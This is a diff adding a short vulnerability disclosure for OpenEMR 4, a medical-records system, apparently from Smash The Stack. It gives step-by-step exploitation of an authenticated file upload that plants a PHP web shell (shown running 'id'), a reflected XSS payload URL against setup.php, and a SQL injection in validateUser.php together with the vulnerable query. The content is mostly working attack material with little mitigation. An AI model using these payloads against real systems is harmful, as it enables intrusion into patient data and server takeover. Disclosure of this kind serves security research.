@@ -1,0 +1,33 @@
+OpenEMR 4 (Level @ Smash The Stack)
+Summary: Patient Photograph Arbitrary File Upload
+
+Initial Comment:
+1. Login with valid User/Pass
+2. Patient/Client -> Search/New Patient (search for anything)
+3. Click Documents -> Patient Photograph
+4. Upload Shell
+
+URL: http://www.example.com/openemr/sites/SITENAME/documents/PATIENTID/shell.php.jpg?cmd=id
+EX: http://www.example.com/oe/sites/default/documents/1/shell.php.jpg?cmd=id
+Output: uid=48(apache) gid=48(apache) groups=48(apache)
+
+first installed SITENAME = default
+first installed PATIENTID = 1
+
+
+OpenEMR 4 (Level @ Smash The Stack)
+XSS
+
+http://www.target.com/oe/setup.php?site=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+
+
+OpenEMR 4 (Level @ Smash The Stack)
+
+Summary: validateUser.php SQL Injection
+
+Initial Comment:
+http://www.target.com/oe/interface/login/validateUser.php?u=test'
+
+validateUser.php:
+$user = $_GET['u'];
+$authDB = sqlQuery("select password,length(password) as passlength from users where username = '$user'");
